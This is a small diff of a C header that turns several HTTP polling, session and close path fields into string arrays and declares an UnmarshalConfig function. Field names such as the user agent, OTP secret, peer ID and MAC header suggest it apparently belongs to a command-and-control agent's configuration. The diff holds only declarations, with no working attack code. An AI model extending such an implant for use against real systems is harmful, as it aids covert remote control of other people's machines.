@@ -89,17 +89,17 @@ typedef struct _SIGNATURE {
 
 struct _HTTP_PROFILE {
 	LPSTR lpUrl;
-	LPSTR PollPaths;
+	LPSTR* PollPaths;
 	DWORD cPollPaths;
-	LPSTR PollFiles;
+	LPSTR* PollFiles;
 	DWORD cPollFiles;
-	LPSTR SessionPaths;
+	LPSTR* SessionPaths;
 	DWORD cSessionPaths;
-	LPSTR SessionFiles;
+	LPSTR* SessionFiles;
 	DWORD cSessionFiles;
-	LPSTR ClosePaths;
+	LPSTR* ClosePaths;
 	DWORD cClosePaths;
-	LPSTR CloseFiles;
+	LPSTR* CloseFiles;
 	DWORD cCloseFiles;
 	LPSTR lpUserAgent;
 	LPSTR lpOtpSecret;
@@ -228,3 +228,8 @@ PBYTE HeaderMAC
 );
 
 UINT64 GeneratePeerID();
+
+PGLOBAL_CONFIG UnmarshalConfig
+(
+	_In_ LPWSTR lpConfigPath
+);
